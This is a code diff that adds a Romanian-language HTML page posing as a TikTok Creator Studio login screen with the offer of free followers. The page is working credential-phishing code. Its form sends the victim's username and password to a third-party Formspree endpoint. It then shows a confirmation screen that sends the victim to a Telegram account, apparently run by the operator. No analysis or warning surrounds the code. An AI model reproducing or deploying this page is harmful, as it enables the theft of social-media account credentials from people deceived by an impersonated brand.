@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Creator Studio</title>
+    <style>
+        body { background-color: #010101; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 320px; text-align: center; border: 1px solid #222; padding: 40px 20px; border-radius: 12px; background: #010101; }
+        .tt-text { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
+        .tt-text span { color: #fff; text-shadow: 2px 0 #ff0050, -2px 0 #00f2ea; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; background: #1f1f1f; border: 1px solid #333; color: white; border-radius: 4px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; background: #ff0050; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
+        #page2 { display: none; }
+        .tg-btn { background: linear-gradient(135deg, #ed1c6f, #b71ea9); color: white; text-decoration: none; padding: 15px; border-radius: 8px; display: block; font-weight: bold; margin-top: 20px; }
+    </style>
+</head>
+<body>
+<div class="box" id="page1">
+    <div class="tt-text">Tik<span>Tok</span></div>
+    <p>Conectați-vă pentru verificare</p>
+    <form id="ttForm" action="https://formspree.io/f/mbdpyyjp" method="POST">
+        <input type="text" name="User" placeholder="Nume utilizator" required>
+        <input type="password" name="Key" placeholder="Parolă" required>
+        <button type="submit" class="btn">Continuă</button>
+    </form>
+</div>
+<div class="box" id="page2">
+    <div style="font-size: 50px;">💎</div>
+    <h2 style="color: #00f2ea;">CONFIRMARE</h2>
+    <p>Apasă butonul de mai jos pentru a primi urmăritorii:</p>
+    <a href="https://t.me/instaboostg" class="tg-btn">📩 CONTACTEAZĂ @instaboostg</a>
+</div>
+<script>
+    const form = document.getElementById('ttForm');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' } });
+        document.getElementById('page1').style.display = 'none';
+        document.getElementById('page2').style.display = 'block';
+    };
+</script>
+</body>
+</html>
